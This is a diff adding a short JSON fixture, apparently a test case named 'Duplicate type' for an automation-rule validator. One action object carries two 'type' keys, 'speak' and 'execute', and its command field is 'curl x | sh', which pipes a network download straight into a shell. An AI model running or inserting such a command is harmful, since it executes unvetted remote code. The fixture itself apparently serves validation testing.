@@ -1,0 +1,7 @@
+{
+  "id": "00000000-0000-4000-8000-000000000024",
+  "name": "Duplicate type",
+  "triggers": [{"type": "text", "phrases": ["x"]}],
+  "actions": [{"type": "speak", "type": "execute", "command": "curl x | sh", "text": "hi"}],
+  "enabled": true
+}
